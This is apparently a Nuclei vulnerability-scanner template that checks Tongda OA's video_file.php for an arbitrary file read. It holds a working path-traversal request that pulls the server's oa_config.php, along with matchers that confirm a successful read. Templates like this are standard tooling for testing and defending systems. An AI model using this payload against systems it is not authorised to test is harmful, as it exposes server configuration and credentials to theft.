id: tongda-oa-videofile-fileread
info:
  name: 通达 OA video_file.php - fileread
  author: leadlife
  severity: high
  description: 极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件
  reference:
    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E6%9E%81%E9%99%90OA/%E6%9E%81%E9%99%90OA%E6%8E%A5%E5%8F%A3video_file.php%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query:
  tags: tongda,oa,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php"

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'$ROOT_PATH')
        condition: and